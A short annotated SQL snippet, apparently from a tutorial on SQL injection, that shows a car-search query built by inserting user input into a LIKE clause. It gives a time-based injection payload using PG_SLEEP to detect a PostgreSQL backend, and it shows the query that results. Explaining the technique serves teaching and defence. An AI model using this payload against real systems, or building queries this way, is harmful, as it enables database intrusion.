-- This is our base Search query:
SELECT make, model, price FROM cars WHERE make LIKE '%{make}%';

-- Query to determine database type: 
-- It will take 1 second per row found, and will only work for ppostgres
-- By typing: {{Honda' AND '' = PG_SLEEP(1)::text; --}} into the search bar,
-- You are effectively producing this query:
SELECT make, model, price FROM cars WHERE make LIKE '%Honda' AND '' = PG_SLEEP(1)::text; --%';
